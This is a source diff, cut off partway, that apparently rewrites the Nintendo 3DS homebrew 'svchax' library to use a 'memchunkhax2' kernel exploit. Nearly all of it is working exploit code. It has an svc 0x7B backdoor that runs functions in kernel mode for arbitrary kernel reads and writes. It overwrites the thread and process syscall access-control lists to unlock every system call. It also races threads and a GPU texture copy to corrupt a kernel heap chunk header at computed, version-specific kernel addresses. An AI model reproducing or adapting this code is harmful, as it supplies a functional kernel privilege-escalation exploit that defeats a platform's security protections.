@@ -2,444 +2,265 @@
 #include <stdio.h>
 #include <string.h>
 #include <malloc.h>
+#include "svchax.h"
 
+#define CURRENT_KTHREAD          0xFFFF9000
+#define CURRENT_KPROCESS         0xFFFF9004
+#define CURRENT_KPROCESS_HANDLE  0xFFFF8001
+#define RESOURCE_LIMIT_THREADS   0x2
 
-u32 backdoor_args;
-Result (*backdoor_entry)(void* args);
+#define MCH2_THREAD_COUNT_MAX    0x20
+#define MCH2_THREAD_STACKS_SIZE  0x1000
 
-s32 backdoor_wrap(void)
+#define SVC_ACL_OFFSET(svc_id)   (((svc_id) >> 5) << 2)
+#define SVC_ACL_MASK(svc_id)     (0x1 << ((svc_id) & 0x1F))
+#define THREAD_PAGE_ACL_OFFSET   0xF38
+
+u32 __ctr_svchax = 0;
+u32 __ctr_svchax_srv = 0;
+
+extern void* __service_ptr;
+extern Handle gspEvents[GSPGPU_EVENT_MAX];
+
+typedef u32(*backdoor_fn)(u32 arg0, u32 arg1);
+
+__attribute((naked))
+static u32 svc_7b(backdoor_fn entry_fn, ...) // can pass up to two arguments to entry_fn(...)
 {
-   __asm__ volatile("cpsid aif \n\t");
-   backdoor_args = backdoor_entry((void*)backdoor_args);
+   __asm__ volatile(
+      "push {r0, r1, r2} \n\t"
+      "mov r3, sp \n\t"
+      "add r0, pc, #12 \n\t"
+      "svc 0x7B \n\t"
+      "add sp, sp, #8 \n\t"
+      "ldr r0, [sp], #4 \n\t"
+      "bx lr \n\t"
+      "cpsid aif \n\t"
+      "ldr r2, [r3], #4 \n\t"
+      "ldmfd r3!, {r0, r1} \n\t"
+      "push {r3, lr} \n\t"
+      "blx r2 \n\t"
+      "pop {r3, lr} \n\t"
+      "str r0, [r3, #-4]! \n\t"
+      "bx lr \n\t");
    return 0;
 }
 
-Result svc_7b(Result(*entry)(void* args), void* args)
+static void k_enable_all_svcs(u32 isNew3DS)
 {
-   backdoor_args = (u32)args;
-   backdoor_entry = entry;
+   u32* thread_ACL = *(*(u32***)CURRENT_KTHREAD + 0x22) - 0x6;
+   u32* process_ACL = *(u32**)CURRENT_KPROCESS + (isNew3DS ? 0x24 : 0x22);
 
-   __asm__ volatile("cpsid aif \n\t");
-   svcBackdoor(backdoor_wrap);
-   __asm__ volatile("cpsie aif \n\t");
-   return (Result)backdoor_args;
+   memset(thread_ACL, 0xFF, 0x10);
+   memset(process_ACL, 0xFF, 0x10);
 }
 
-
-Result read_mem_7b(void* kaddr)
+static u32 k_read_kaddr(u32* kaddr)
 {
-   u32* ptr = (u32*)kaddr;
-   return *ptr;
+   return *kaddr;
 }
 
-u32 read_kaddr(u32 kaddr)
+static u32 read_kaddr(u32 kaddr)
 {
-   return (u32)svc_7b(read_mem_7b, (void*)kaddr);
+   return svc_7b((backdoor_fn)k_read_kaddr, kaddr);
 }
 
-Result write_mem_7b(void* args)
+static u32 k_write_kaddr(u32* kaddr, u32 val)
 {
-   u32* vals = (u32*)args;
-   *(u32*)vals[0] = vals[1];
+   *kaddr = val;
    return 0;
 }
 
-void write_kaddr(u32 kaddr, u32 val)
+static void write_kaddr(u32 kaddr, u32 val)
 {
-   u32 vals[] = {kaddr, val};
-   svc_7b(write_mem_7b, vals);
+   svc_7b((backdoor_fn)k_write_kaddr, kaddr, val);
 }
 
-
-Handle arbiter;
-volatile u32 alloc_address;
-volatile u32 alloc_size;
-
-volatile bool lock_thread;
-
-volatile bool lock_alloc;
-volatile bool alloc_finished;
-
-void alloc_thread(void* arg)
-{
-   u32 tmp;
-   alloc_finished = false;
-
-   while (lock_alloc)
-      svcSleepThread(100);
-
-   svcControlMemory(&tmp, alloc_address, 0x0, alloc_size, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE);
-   alloc_finished = true;
-   svcExitThread();
-}
-u8 flush_buffer[0x10000];
-void poll_thread(void* arg)
-{
-   while ((u32) svcArbitrateAddress(arbiter, alloc_address, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814)
-      svcSleepThread(10000);
-   __asm__ volatile("cpsid aif \n\t");
-   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
-   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
-   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
-   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
-   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
-   while (lock_thread);
-   __asm__ volatile("cpsie aif \n\t");
-   svcExitThread();
-}
-
-typedef struct
-{
-   u32 version;
-   u32 kthread_addr;
-   u32 lock_addr;
-   u32 buffer[0x80];
-}fake_page_t;
-
-fake_page_t fake_pages[] = {
-   {
-      0x022E0000, 0xFFF849E0, 0xFFF718D8,
-      {
-         0xFFF7B038, 0x00000000, 0xFFF84A90, 0xFFF063AC, 0xFFF84A90, 0xFF54A000, 0xFFF7B038, 0xFFF021F4,
-         0xFF565E28, 0xFFF0EB80, 0xFFF84A90, 0xFF54A000, 0xFFF7B038, 0x00000000, 0xFFF84A90, 0x00000030,
-         0x00000003, 0xFFF147C4, 0x00000118, 0x00000001, 0x00000000, 0xFFF84A90, 0x00108E04, 0x028A804D,
-         0xFF54A000, 0xFFF7B038, 0x001A43EC, 0x00000030, 0x00000000, 0xFFF84A90, 0x00000001, 0xFFF84A90,
-         0x00000001, 0xFFFD50C8, 0x60000013, 0xFFF849E0, 0xFFF30DF4, 0xFFF30DF4, 0xFFF718D8, 0x000799E3,
-         0x09401BFE, 0xFFF19BBC, 0xFFFD50C8, 0xFFF1C97C, 0x00000000, 0x001C599C, 0xFFFFFFFF, 0xFFF06B38,
-         0xFFF718D8, 0x001C599C, 0xFFF718D8, 0xFFFFFFFF, 0xFFF2D0C8, 0x00000000, 0xFFF2801F, 0x00000001,
-         0x00000000, 0xFFF059A4, 0xFFFFFFFF, 0x001C599C, 0xFFF2C91E, 0x0000001F, 0x00000000, 0x00000000,
-         0x00000000, 0x00000000, 0xFFF058C4, 0x00000024, 0x00000000, 0xFFF022E0, 0x00000000, 0x00000000,
-         0x00000000, 0x00000000, 0x001C5978, 0x00108EAC, 0x00108F5C, 0x00000010, 0xFFFA9F4E, 0x3FE7FFBF,
-         0x00000000, 0x00000000, 0x24000000, 0x00000000, 0xFFFD50C8, 0x60000013, 0xFFF849E0, 0xFFF30DF4,
-         0xFFF30DF4, 0xFFF718D8, 0x000799E3, 0x09401BFE, 0xFF565EB0, 0xFFF1C97C, 0x00000000, 0x00000000,
-         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
-         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
-         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
-         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x03C00000
-      }
-   },
-   {
-      0x02320100, 0xFFF84918, 0xFFF718B0,
-      {
-         0xFFF849C8, 0xFF556000, 0xFFF7B390, 0x00000000, 0xFFF84900, 0x00000000, 0x00000007, 0xFFF0B42C,
-         0x0000000A, 0xFFF0B42C, 0x0000000A, 0x00000001, 0xFFF7B464, 0x00000000, 0xFFF849C8, 0x0000008D,
-         0xFF565EE8, 0xFFF063A0, 0xFFF7B464, 0xFFF7B474, 0x00000001, 0xFFF849C8, 0x00000001, 0xFFFD50C8,
-         0x60000013, 0xFFF84918, 0xFFF30DF4, 0xFFF30DF4, 0xFFF718B0, 0x00059FAB, 0x09401BFE, 0xFFF19EF8,
-         0xFFFD50C8, 0xFFF1CCB8, 0x00000000, 0x0014F99C, 0xFFFFFFFF, 0xFFF06B44, 0xFFF718B0, 0x0014F99C,
-         0xFFF718B0, 0xFFFFFFFF, 0xFFF2D0C8, 0x00000000, 0xFFF2851F, 0x00000001, 0x00000000, 0xFFF05998,
-         0xFFFFFFFF, 0x0014F99C, 0xFFF2C91E, 0x0000001F, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
-         0xFFF058B8, 0x00000024, 0x00000001, 0xFFF022A4, 0x00180025, 0xFFFFFFFF, 0xFFFFFFFF, 0x0014F99C,
-         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
-         0x00000000, 0x00000000, 0x0014F978, 0x00100EAC, 0x00100F5C, 0x00000010, 0xFFFA9F4E, 0x3FE7FFBF,
-         0x00000000, 0x08000000, 0x24000100, 0x00000000, 0xFFFD50C8, 0x60000013, 0xFFF84918, 0xFFF30DF4,
-         0xFFF30DF4, 0xFFF718B0, 0x00059FAB, 0x09401BFE, 0xFF565E88, 0xFFF1CCB8, 0x00000000, 0x00000000,
-         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
-         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
-         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
-         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x03C00000
-      }
-   },
-   {
-      0x02320B00, 0xFFF84398, 0xFFF71C70,
-      {
-         0xFFF84A78, 0xFF556000, 0xFFF7B390, 0x00000000, 0xFFF84A78, 0x00000030, 0x00000000, 0xFFF14800,
-         0x0000000A, 0xFFF0B3F8, 0x0000000A, 0x00000001, 0xFFF7B464, 0x00000000, 0xFFF84A78, 0x0000008D,
-         0xFF565EE8, 0xFFF06360, 0xFFF7B464, 0xFFF7B474, 0x00000001, 0xFFF84A78, 0x00000001, 0xFFFD50C8,
-         0x60000013, 0xFFF84398, 0xFFF30DF4, 0xFFF30DF4, 0xFFF71C70, 0x00059FAC, 0x09401BFE, 0xFFF19EC4,
-         0xFFFD50C8, 0xFFF1CCB0, 0x00000000, 0x0014F99C, 0xFFFFFFFF, 0xFFF06B04, 0xFFF71C70, 0x0014F99C,
-         0xFFF71C70, 0xFFFFFFFF, 0xFFF2D0C8, 0x00000000, 0xFFF2851F, 0x00000001, 0x00000000, 0xFFF059A0,
-         0xFFFFFFFF, 0x0014F99C, 0xFFF2C91E, 0x0000001F, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
-         0xFFF058C0, 0x00000024, 0x00000001, 0xFFF022AC, 0x00180025, 0xFFFFFFFF, 0xFFFFFFFF, 0x0014F99C,
-         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
-         0x00000000, 0x00000000, 0x0014F978, 0x00100EAC, 0x00100F5C, 0x00000010, 0xFFFA9F4E, 0x3FE7FFBF,
-         0x00000000, 0x08000000, 0x24000100, 0x00000000, 0xFFFD50C8, 0x60000013, 0xFFF84398, 0xFFF30DF4,
-         0xFFF30DF4, 0xFFF71C70, 0x00059FAC, 0x09401BFE, 0xFF565E88, 0xFFF1CCB0, 0x00000000, 0x00000000,
-         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
-         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
-         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
-         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x03C00000
-      }
-   }
-};
-
-typedef struct
-{
-   u32 svc_stack [0xF00 >> 2];
-   u32 unkown_F00;
-   u32 unkown_F04;
-   u32 unkown_F08;
-   u32 unkown_F0C;
-   u32 unkown_F10;
-   u32 unkown_F14;
-   u32 unkown_F18;
-   u32 unkown_F1C;
-   u32 unkown_F20;
-   u32 unkown_F24;
-   u32 usr_sp; //0xF28
-   u32 usr_lr; //0xF2C
-   u32 usr_pc; //0xF30
-   u32 unkown_F34;
-   u32 svc_ctl[4]; //0xF38
-   u8 unkown_F48;
-   u8 unkown_F49;
-   u8 unkown_F4A;
-   u8 svc_id;     //0xF4B
-   u32 unkown_F4C;
-   u32 svc_r4; //0xF50
-   u32 svc_r5; //0xF54
-   u32 svc_r6; //0xF58
-   u32 svc_r7; //0xF5C
-   u32 svc_r8; //0xF60
-   u32 svc_r9; //0xF64
-   u32 svc_sl; //0xF68
-   u32 svc_fp; //0xF6C
-   u32 svc_sp; //0xF70
-   u32 svc_lr; //0xF74
-   u32 vfp_regs[0x20]; //0xF78
-   u32 unknown_FF8;
-   u32 unknown_FFC;
-} thread_page_t;
-
-typedef struct
-{
-   u32 r0;
-   u32 r1;
-   u32 r2;
-   u32 r3;
-   u32 r4;
-   u32 r5;
-   u32 r6;
-   u32 r7;
-   u32 r8;
-   u32 r9;
-   u32 r10;
-   u32 r11;
-   u32 r12;
-   u32 sp;
-   u32 lr;
-   u32 pc;
-
-} regstate_t;
-typedef struct
-{
-   thread_page_t page;
-   u32 stack[0x1000];
-   regstate_t regs;
-   Handle handle;
-   u32 kthread_addr;
-   Handle lock;
-   u32 lock_addr;
-   volatile bool ready;
-   volatile bool has_7B_access;
-   u32 thread_page_va;
-   u32 thread_page_kva;
-   u32 offset;
-   u32 main_thread_page_addr;
-
-} target_thread_vars_t;
-
-target_thread_vars_t target;
-
+__attribute__((naked))
 static u32 get_thread_page(void)
 {
-   register u32 r0 __asm__("r0");
    __asm__ volatile(
       "sub r0, sp, #8 \n\t"
       "mov r1, #1 \n\t"
       "mov r2, #0 \n\t"
-      "svc    0x2A \n\t"
+      "svc	0x2A \n\t"
       "mov r0, r1, LSR#12 \n\t"
       "mov r0, r0, LSL#12 \n\t"
-      :::"r0", "r1", "r2");
-   return r0;
-}
-
-s32 backup_page_kernel(void)
-{
-   __asm__ volatile("cpsid aif \n\t");
-   memcpy(&target.page, (void*)target.thread_page_va, 0x1000);
-   return 0;
-}
-s32 restore_page_kernel(void)
-{
-   __asm__ volatile("cpsid aif \n\t");
-   memcpy((void*)target.thread_page_va, &target.page, 0x1000);
+      "bx lr \n\t");
    return 0;
 }
 
-void create_target_page()
+typedef struct
 {
-   u32 version = *(u32*)0x1FF80000;
-   int i;
-   fake_page_t* fake_page = fake_pages;
-   for (i = 1; i < (sizeof(fake_pages)/sizeof(*fake_pages)); i++)
-   {
-      if(version >= fake_pages[i].version)
-         fake_page = fake_pages + i;
-   }
-   memcpy((u8*)&target.page + sizeof(target.page) - sizeof(fake_page->buffer), fake_page->buffer, sizeof(fake_page->buffer));
-   target.page.svc_sp = (target.page.svc_sp & 0xFFF) | (target.thread_page_va & ~0xFFF);
-   target.page.usr_lr = target.regs.lr;
-   target.page.usr_sp = target.regs.sp;
-   target.page.usr_pc = target.regs.pc;
-   target.page.svc_ctl[0] = 0xFFFFFFFF;
-   target.page.svc_ctl[1] = 0xFFFFFFFF;
-   target.page.svc_ctl[2] = 0xFFFFFFFF;
-   target.page.svc_ctl[3] = 0xFFFFFFFF;
-//   target.page.svc_ctl[3] = 0x0F000000;
-   extern void* __service_ptr;
+   Handle started_event;
+   Handle lock;
+   volatile u32 target_kaddr;
+   volatile u32 target_val;
+} mch2_thread_args_t;
 
-   if(__service_ptr)
-      target.offset = 0xCB8;
-   else
-      target.offset = 0xC90;
+typedef struct
+{
+   u32* stack_top;
+   Handle handle;
+   bool keep;
+   mch2_thread_args_t args;
+} mch2_thread_t;
 
-   u32* tpage = (u32*)&target.page;
-   for (i = 0; i < 0x400; i++)
-   {
-      if (tpage[i] == fake_page->kthread_addr)
-         tpage[i] = target.kthread_addr;
-      else if (tpage[i] == fake_page->lock_addr)
-         tpage[i] = target.lock_addr;
-   }
+typedef struct
+{
+   u32 old_cpu_time_limit;
+   u8 isNew3DS;
+   u32 kernel_fcram_mapping_offset;
+
+   Handle arbiter;
+   volatile u32 alloc_address;
+   volatile u32 alloc_size;
+   u8* flush_buffer;
+
+   Handle dummy_threads_lock;
+   Handle target_threads_lock;
+   Handle main_thread_lock;
+   u32* thread_page_va;
+   u32 thread_page_kva;
+
+   u32 threads_limit;
+   Handle alloc_thread;
+   Handle poll_thread;
+   mch2_thread_t threads[MCH2_THREAD_COUNT_MAX];
+} mch2_vars_t;
+
+static void alloc_thread_entry(mch2_vars_t* mch2)
+{
+   u32 tmp;
+
+   svcControlMemory(&tmp, mch2->alloc_address, 0x0, mch2->alloc_size, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE);
+   svcExitThread();
 }
-void dummy_thread_entry(Handle lock)
+
+static void dummy_thread_entry(Handle lock)
 {
    svcWaitSynchronization(lock, U64_MAX);
    svcExitThread();
 }
 
-Result patch_thread_acl(void* args)
+static void check_tls_thread_entry(bool* keep)
 {
-   u32* page = (u32*)args;
-   page[0xF38 >> 2] = 0xFFFFFFFF;
-   page[0xF3C >> 2] = 0xFFFFFFFF;
-   page[0xF40 >> 2] = 0xFFFFFFFF;
-   page[0xF44 >> 2] = 0xFFFFFFFF;
-   return 0;
+   *keep = !((u32)getThreadLocalStorage() & 0xFFF);
+   svcExitThread();
 }
 
-void target_thread_entry(void* args)
+static void target_thread_entry(mch2_thread_args_t* args)
 {
-   u32 tmp;
-   (void)args;
-   Handle tmp_thread;
-   static u32 tmp_thread_stack[0x1000];
-   Handle tmp_thread_lock;
-   svcCreateEvent(&tmp_thread_lock, 1);
-   svcClearEvent(tmp_thread_lock);
+   svcSignalEvent(args->started_event);
+   svcWaitSynchronization(args->lock, U64_MAX);
 
-   svcCreateThread(&tmp_thread, (ThreadFunc)dummy_thread_entry, tmp_thread_lock,
-                                   (u32*)&tmp_thread_stack[0x400], 0x30, 0);
-   svcSignalEvent(tmp_thread_lock);
-   svcWaitSynchronization(tmp_thread, U64_MAX);
-   svcCloseHandle(tmp_thread);
-   svcCloseHandle(tmp_thread_lock);
-
-   target.thread_page_va = get_thread_page();
-   target.regs.r0 = target.lock;
-   target.regs.r1 = 0xFFFFFFFF;
-   target.regs.r2 = 0xFFFFFFFF;
-   target.ready = true;
-   __asm__ volatile(
-      "mov r2, %0 \n\t"
-      "str r3,  [r2 , #0x0C] \n\t"
-      "str r4,  [r2 , #0x10] \n\t"
-      "str r5,  [r2 , #0x14] \n\t"
-      "str r6,  [r2 , #0x18] \n\t"
-      "str r7,  [r2 , #0x1C] \n\t"
-      "str r8,  [r2 , #0x20] \n\t"
-      "str r9,  [r2 , #0x24] \n\t"
-      "str r10, [r2 , #0x28] \n\t"
-      "str r11, [r2 , #0x2C] \n\t"
-      "str r12, [r2 , #0x30] \n\t"
-      "str r13, [r2 , #0x34] \n\t"
-      "str r14, [r2 , #0x38] \n\t"
-      "add r0,  r15, #0x10   \n\t"
-      "str r0,  [r2 , #0x3C] \n\t"
-      "ldr r0,  [r2 , #0x00] \n\t"
-      "ldr r1,  [r2 , #0x04] \n\t"
-      "ldr r2,  [r2 , #0x08] \n\t"
-      "svc 0x24 \n\t"
-      ::"r"(&target.regs):"r0", "r1", "r2");
-
-   if (target.has_7B_access)
-      svc_7b(patch_thread_acl, (void*)target.main_thread_page_addr);
+   if (args->target_kaddr)
+      write_kaddr(args->target_kaddr, args->target_val);
 
    svcExitThread();
 }
 
-u32 get_first_free_basemem_page()
+static u32 get_first_free_basemem_page(bool isNew3DS)
 {
-   s64 v1, v2;
-   svcGetSystemInfo(&v1, 2, 0);
-   svcGetSystemInfo(&v2, 0, 3);
+   s64 v1;
+   int memused_base;
+   int memused_base_linear;  // guessed
 
-   return 0xE006C000 + *(u32*)0x1FF80040 + *(u32*)0x1FF80044 + *(u32*)0x1FF80048 + v1 - v2 - (*(u32*)0x1FF80000 == 0x022E0000? 0x1000: 0x0);
+   memused_base = osGetMemRegionUsed(MEMREGION_BASE);
+
+   svcGetSystemInfo(&v1, 2, 0);
+   memused_base_linear = 0x6C000 + v1 +
+                         (osGetKernelVersion() > SYSTEM_VERSION(2, 49, 0) ? (isNew3DS ? 0x2000 : 0x1000) : 0x0);
+
+   return (osGetKernelVersion() > SYSTEM_VERSION(2, 40, 0) ? 0xE0000000 : 0xF0000000) // kernel FCRAM mapping
+          + (isNew3DS ? 0x10000000 : 0x08000000)  // FCRAM size
+          - (memused_base - memused_base_linear)  // memory usage for pages allocated without the MEMOP_LINEAR flag
+          - 0x1000;  // skip to the start addr of the next free page
+
 }
 
-
-Result svchax_init(void)
+static u32 get_threads_limit(void)
 {
+   Handle resource_limit_handle;
+   s64 thread_limit_current;
+   s64 thread_limit_max;
+   u32 thread_limit_name = RESOURCE_LIMIT_THREADS;
+
+   svcGetResourceLimit(&resource_limit_handle, CURRENT_KPROCESS_HANDLE);
+   svcGetResourceLimitCurrentValues(&thread_limit_current, resource_limit_handle, &thread_limit_name, 1);
+   svcGetResourceLimitLimitValues(&thread_limit_max, resource_limit_handle, &thread_limit_name, 1);
+   svcCloseHandle(resource_limit_handle);
+
+   if (thread_limit_max > MCH2_THREAD_COUNT_MAX)
+      thread_limit_max = MCH2_THREAD_COUNT_MAX;
+
+   return thread_limit_max - thread_limit_current;
+}
+
+static void do_memchunkhax2(void)
+{
+   static u8 flush_buffer[0x8000];
+   static u8 thread_stacks[MCH2_THREAD_STACKS_SIZE];
+
    int i;
    u32 tmp;
-   target.main_thread_page_addr = get_thread_page();
+   mch2_vars_t mch2 = {0};
 
-   const u32 dummy_threads_count = 8;
-   Handle dummy_thread_handles[8];
-   static u8 dummy_thread_stacks[8][0x1000];
-   Handle dummy_thread_lock;
-   svcCreateEvent(&dummy_thread_lock, 1);
-   svcClearEvent(dummy_thread_lock);
+   mch2.flush_buffer = flush_buffer;
+   mch2.threads_limit = get_threads_limit();
+   mch2.kernel_fcram_mapping_offset = (osGetKernelVersion() > SYSTEM_VERSION(2, 40, 0)) ? 0xC0000000 : 0xD0000000;
 
-   for (i = 0; i < dummy_threads_count; i++)
+   for (i = 0; i < MCH2_THREAD_COUNT_MAX; i++)
+      mch2.threads[i].stack_top = (u32*)((u32)thread_stacks + (i + 1) * (MCH2_THREAD_STACKS_SIZE / MCH2_THREAD_COUNT_MAX));
+
+   aptOpenSession();
+   APT_CheckNew3DS(&mch2.isNew3DS);
+   APT_GetAppCpuTimeLimit(&mch2.old_cpu_time_limit);
+   APT_SetAppCpuTimeLimit(5);
+   aptCloseSession();
+
+   for (i = 0; i < mch2.threads_limit; i++)
    {
-      svcCreateThread(&dummy_thread_handles[i], (ThreadFunc)dummy_thread_entry, dummy_thread_lock,
-                                      (u32*)(&dummy_thread_stacks[i][sizeof(*dummy_thread_stacks) / sizeof(**dummy_thread_stacks)]), 0x30, 0);
+      svcCreateThread(&mch2.threads[i].handle, (ThreadFunc)check_tls_thread_entry, (u32)&mch2.threads[i].keep,
+                      mch2.threads[i].stack_top, 0x18, 0);
+      svcWaitSynchronization(mch2.threads[i].handle, U64_MAX);
    }
 
-   svcCreateEvent(&target.lock, 0);
-   svcClearEvent(target.lock);
-   register u32 reg_r2 __asm__("r2");
-   target.lock_addr = reg_r2 - 0x4;
-   target.ready = false;
-   target.has_7B_access = false;
-   target.thread_page_kva = get_first_free_basemem_page();
+   for (i = 0; i < mch2.threads_limit; i++)
+      if (!mch2.threads[i].keep)
+         svcCloseHandle(mch2.threads[i].handle);
 
-   svcCreateThread(&target.handle, (ThreadFunc)target_thread_entry, 0,
-                                   &target.stack[sizeof(target.stack) / sizeof(*target.stack)], 0x3F, 0);
-   svcDuplicateHandle(&tmp, target.handle);
-   svcCloseHandle(tmp);
-   target.kthread_addr = reg_r2 - 0x4;
+   svcCreateEvent(&mch2.dummy_threads_lock, 1);
+   svcClearEvent(mch2.dummy_threads_lock);
 
-   svcSignalEvent(dummy_thread_lock);
-   for (i = 0; i < dummy_threads_count ; i++)
-   {
-      gfxFlushBuffers();
-      svcWaitSynchronization(dummy_thread_handles[i], U64_MAX);
-      svcCloseHandle(dummy_thread_handles[i]);
-   }
-   svcCloseHandle(dummy_thread_lock);
+   for (i = 0; i < mch2.threads_limit; i++)
+      if (!mch2.threads[i].keep)
+         svcCreateThread(&mch2.threads[i].handle, (ThreadFunc)dummy_thread_entry, mch2.dummy_threads_lock,
+                         mch2.threads[i].stack_top, 0x3F - i, 0);
 
-   while (!target.ready)
-      svcSleepThread(20000);
+   svcSignalEvent(mch2.dummy_threads_lock);
 
-   gfxFlushBuffers();
-   create_target_page();
+   for (i = mch2.threads_limit - 1; i >= 0; i--)
+      if (!mch2.threads[i].keep)
+      {
+         svcWaitSynchronization(mch2.threads[i].handle, U64_MAX);
+         svcCloseHandle(mch2.threads[i].handle);
+         mch2.threads[i].handle = 0;
+      }
+
+   svcSleepThread(30000000LL);
+   svcCloseHandle(mch2.dummy_threads_lock);
 
    u32 fragmented_address = 0;
 
-   arbiter = __sync_get_arbiter();
-   aptOpenSession();
-   APT_SetAppCpuTimeLimit(5);
-   aptCloseSession();
+   mch2.arbiter = __sync_get_arbiter();
 
    u32 linear_buffer;
    svcControlMemory(&linear_buffer, 0, 0, 0x1000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);
 
    u32 linear_size = 0xF000;
    u32 skip_pages = 2;
-   alloc_size = ((((linear_size - (skip_pages << 12)) + 0x1000) >> 13) << 12);
+   mch2.alloc_size = ((((linear_size - (skip_pages << 12)) + 0x1000) >> 13) << 12);
    u32 mem_free = osGetMemRegionFree(MEMREGION_APPLICATION);
 
    u32 fragmented_size = mem_free - linear_size;
@@ -447,13 +268,11 @@ Result svchax_init(void)
    extern u32 __ctru_heap_size;
    fragmented_address = __ctru_heap + __ctru_heap_size;
    u32 linear_address;
-   alloc_address = fragmented_address + fragmented_size;
-   gfxFlushBuffers();
+   mch2.alloc_address = fragmented_address + fragmented_size;
 
    svcControlMemory(&linear_address, 0x0, 0x0, linear_size, MEMOP_ALLOC_LINEAR,
                     MEMPERM_READ | MEMPERM_WRITE);
 
-   gfxFlushBuffers();
    if (fragmented_size)
       svcControlMemory(&tmp, (u32)fragmented_address, 0x0, fragmented_size, MEMOP_ALLOC,
                        MEMPERM_READ | MEMPERM_WRITE);
@@ -464,124 +283,223 @@ Result svchax_init(void)
    for (i = skip_pages; i < (linear_size >> 12) ; i += 2)
       svcControlMemory(&tmp, (u32)linear_address + (i << 12), 0x0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE);
 
-   u32 alloc_address_kaddr = osConvertVirtToPhys((void*)linear_address) + 0xC0000000;
+   u32 alloc_address_kaddr = osConvertVirtToPhys((void*)linear_address) + mch2.kernel_fcram_mapping_offset;
 
-   tmp = alloc_address_kaddr;
-
-   gfxFlushBuffers();
-   u32 args;
-   Handle alloc_thread_handle = 0;
-   Handle poll_thread_handle = 0;
-   static u8 alloc_thread_stack [0x1000];
-   static u8 poll_thread_stack [0x1000];
-
-   gfxFlushBuffers();
-   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
-   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
-   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
-
+   mch2.thread_page_kva = get_first_free_basemem_page(mch2.isNew3DS) - 0x10000; // skip down 16 pages
    ((u32*)linear_buffer)[0] = 1;
-   ((u32*)linear_buffer)[1] = target.thread_page_kva + target.offset;
-   ((u32*)linear_buffer)[2] = alloc_address_kaddr + (((alloc_size >> 12) - 3) << 13) + (skip_pages << 12);
+   ((u32*)linear_buffer)[1] = mch2.thread_page_kva;
+   ((u32*)linear_buffer)[2] = alloc_address_kaddr + (((mch2.alloc_size >> 12) - 3) << 13) + (skip_pages << 12);
 
-   u32 dst_memchunk = linear_address + (((alloc_size >> 12) - 2) << 13) + (skip_pages << 12);
-   gfxFlushBuffers();
-   lock_thread = true;
-   lock_alloc = true;
-   alloc_finished = false;
-   svcCreateThread(&alloc_thread_handle, alloc_thread, (u32)&args, (u32*)(alloc_thread_stack + 0x1000), 0x3F, 1);
-   svcCreateThread(&poll_thread_handle, poll_thread, (u32)&args, (u32*)(poll_thread_stack + 0x1000), 0x18, 1);
+   u32 dst_memchunk = linear_address + (((mch2.alloc_size >> 12) - 2) << 13) + (skip_pages << 12);
 
-   lock_alloc = false;
-   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
+   memcpy(flush_buffer, flush_buffer + 0x4000, 0x4000);
+
    GSPGPU_InvalidateDataCache((void*)dst_memchunk, 16);
    GSPGPU_FlushDataCache((void*)linear_buffer, 16);
-   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
-   extern Handle gspEvents[GSPGPU_EVENT_MAX];
+   memcpy(flush_buffer, flush_buffer + 0x4000, 0x4000);
    svcClearEvent(gspEvents[GSPGPU_EVENT_PPF]);
 
-   while ((u32) svcArbitrateAddress(arbiter, alloc_address, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814);
-
+   svcCreateThread(&mch2.alloc_thread, (ThreadFunc)alloc_thread_entry, (u32)&mch2,
+                   mch2.threads[MCH2_THREAD_COUNT_MAX - 1].stack_top, 0x3F, 1);
+   while ((u32) svcArbitrateAddress(mch2.arbiter, mch2.alloc_address, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0,
+                                    0) == 0xD9001814);
    GX_TextureCopy((void*)linear_buffer, 0, (void*)dst_memchunk, 0, 16, 8);
+   memcpy(flush_buffer, flush_buffer + 0x4000, 0x4000);
    svcWaitSynchronization(gspEvents[GSPGPU_EVENT_PPF], U64_MAX);
-   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
-   gfxFlushBuffers();
-   lock_thread = false;
-   u32* src;
-   u32* dst;
 
-   while (!alloc_finished);
-   src = (u32*)((u32)&target.page + 0x1000);
